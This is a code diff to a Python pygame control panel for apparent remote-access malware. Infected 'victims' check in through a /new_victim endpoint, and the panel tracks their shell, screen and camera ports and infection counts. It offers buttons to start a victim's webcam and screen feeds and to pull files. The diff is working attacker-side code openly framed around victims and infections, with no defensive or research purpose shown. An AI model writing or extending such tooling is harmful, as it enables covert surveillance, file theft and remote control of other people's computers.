@@ -44,7 +44,7 @@ NETWORK_RANGES = [
     "192.168.56",
 ]
 
-VICTIM_IPS = ['192.168.1.13']
+VICTIM_IPS = ['192.168.1.15']
 
 # Thread pool for background tasks
 thread_pool = ThreadPoolExecutor(max_workers=4)
@@ -58,15 +58,38 @@ COMMON_PORTS = [5000, 5001, 5002]  # Ports to check for victims
 
 class HostNotificationHandler(BaseHTTPRequestHandler):
     def do_POST(self):
-        if self.path == '/new_host':
+        if self.path == '/new_victim':
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
             data = json.loads(post_data.decode('utf-8'))
 
-            if 'new_host' in data:
-                new_host = data['new_host']
-                ui_state.discovered_hosts.add(new_host)
-                update_displays()
+            if 'victim_ip' in data:
+                new_victim = data['victim_ip']
+                print(f"New victim connected: {new_victim}")
+                
+                # Add to discovered hosts and VICTIM_IPS if not already present
+                ui_state.discovered_hosts.add(new_victim)
+                if new_victim not in VICTIM_IPS:
+                    VICTIM_IPS.append(new_victim)
+                    
+                # Save the host with full information
+                host_manager.add_host(
+                    new_victim, 
+                    ports=data.get('ports', {
+                        'shell': 5000,
+                        'screen': 5001,
+                        'camera': 5002
+                    })
+                )
+                
+                # Set initial status
+                ui_state.victims_status[new_victim] = "Reachable"
+                
+                # Force UI update in a thread-safe way
+                pygame.event.post(pygame.event.Event(
+                    pygame.USEREVENT, 
+                    {'type': 'new_victim', 'ip': new_victim}
+                ))
 
             self.send_response(200)
             self.end_headers()
@@ -79,20 +102,20 @@ def start_notification_server():
 
 def update_displays():
     """Update displays when new hosts are discovered."""
-    global displays, VICTIM_IPS
+    global displays
     current_ips = [d.text for d in displays]
 
     # Add new displays for discovered hosts
     for host in ui_state.discovered_hosts:
         if host not in current_ips:
-            if host not in VICTIM_IPS:
-                VICTIM_IPS.append(host)
             row = len(displays) // 3
             col = len(displays) % 3
             x = 50 + col * 250
             y = 50 + row * 200
             displays.append(Display(x, y, 200, 150, host, font))
-            ui_state.victims_status[host] = "Not reachable"
+            ui_state.victims_status[host] = "Reachable"
+            # Update max scroll height
+            ui_state.max_scroll_y = max(0, (len(displays) // 3) * 200 + 50 - HEIGHT)
 
 
 class UIState:
@@ -174,12 +197,18 @@ def status_checker_thread(options):
             try:
                 # Check if all required ports are open
                 if all(check_single_victim(host, port) for port in COMMON_PORTS):
-                    ui_state.victims_status[host] = "Reachable"
+                    status = "Reachable"
                 else:
-                    ui_state.victims_status[host] = "Not reachable"
+                    status = "Not reachable"
+                
+                # Update both UI state and host manager
+                ui_state.victims_status[host] = status
+                host_manager.update_host_status(host, status)
+                
             except Exception as e:
                 print(f"Error checking host {host}: {e}")
                 ui_state.victims_status[host] = "Not reachable"
+                host_manager.update_host_status(host, "Not reachable")
 
         pygame.time.delay(2000)  # Check every 2 seconds
 
@@ -191,14 +220,37 @@ def draw_static_frame(surface, frame_rect, border_color=(0, 0, 0), border_width=
 
 def show_full_screen(display, options):
     full_screen = True
-    input_box = InputBox(WIDTH // 4 - 100, HEIGHT // 2 + 160, 590, 130, display.text)
+    host = display.text
+    host_info = host_manager.get_host_info(host)
+    
+    # Use stored port information if available
+    if host_info and 'ports' in host_info:
+        ports = host_info['ports']
+        shell_port = ports.get('shell', options.port)
+        screen_port = ports.get('screen', options.port + 1)
+        camera_port = ports.get('camera', options.port + 2)
+    else:
+        shell_port = options.port
+        screen_port = options.port + 1
+        camera_port = options.port + 2
+
+    input_box = InputBox(WIDTH // 4 - 100, HEIGHT // 2 + 160, 590, 130, host)
     camera_button = Button(WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Camera", GREEN)
     screen_button = Button(3 * WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Screen", BLUE)
     file_button = Button(WIDTH // 2 - 100, HEIGHT // 2 + 100, 190, 50, "Receive File", RED)
 
-    host = display.text
     if host not in ui_state.active_receivers:
         ui_state.active_receivers[host] = {}
+
+    # Show host information
+    if host_info:
+        info_text = [
+            f"First seen: {host_info['first_seen'].split('T')[0]}",
+            f"Infections: {host_info['infection_count']}",
+            f"Status: {host_info['status']}"
+        ]
+    else:
+        info_text = ["No detailed information available"]
 
     clock = pygame.time.Clock()
 
@@ -379,7 +431,10 @@ def main():
                     ui_state.running = False
                     pygame.quit()
                     sys.exit()
-                if event.type == pygame.MOUSEBUTTONDOWN:
+                elif event.type == pygame.USEREVENT:
+                    if event.dict.get('type') == 'new_victim':
+                        update_displays()  # Update UI when new victim connects
+                elif event.type == pygame.MOUSEBUTTONDOWN:
                     if event.button == 1:
                         for display in displays:
                             if display.rect.collidepoint(event.pos[0], event.pos[1] + ui_state.scroll_y):
@@ -410,6 +465,7 @@ def main():
                 status_button.draw(screen, ui_state.scroll_y)
 
             pygame.display.flip()
+            clock.tick(60)
 
     finally:
         # Clean up all active connections
